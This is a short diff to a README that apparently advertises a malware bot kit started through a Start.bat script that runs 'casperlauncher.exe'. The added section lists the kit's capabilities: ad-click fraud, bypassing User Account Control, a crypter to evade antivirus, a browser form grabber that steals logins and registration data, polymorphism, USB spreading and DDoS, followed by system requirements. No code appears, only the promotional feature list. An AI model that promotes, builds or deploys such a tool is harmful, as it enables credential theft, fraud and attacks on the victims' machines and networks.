@@ -64,6 +64,24 @@ This is the content of **Start.bat** script:
 `pause`
 `start casperlauncher.exe`
 
+# Feature 
+
+* Ads Clicking.
+* Anti UAC : Bypass (User Account Control) Prevention
+* Crypter : Will protect your bot from Antivirus detection.
+* Form Grabber : It will grab any form data through browser such as: form login, registration etc.
+* Pollymorphic.
+* USB Spread
+* DDOS.
+* Plugin : Create your own plugin (additional plugin on progress)
+
+# Minimal system requirements
+
+* Windows 98 / 2000 / 2003 / XP / Vista / Win7 / Win 8, 8.1 (same as 32-bit, as 64-bit);
+* CPU 2 GHz, RAM from 2 Gb;
+* It's recommended to use high Internet connection speed without restrictions of traffic.
+ 
+
 ***
 
 # DISCLAIMER EULA
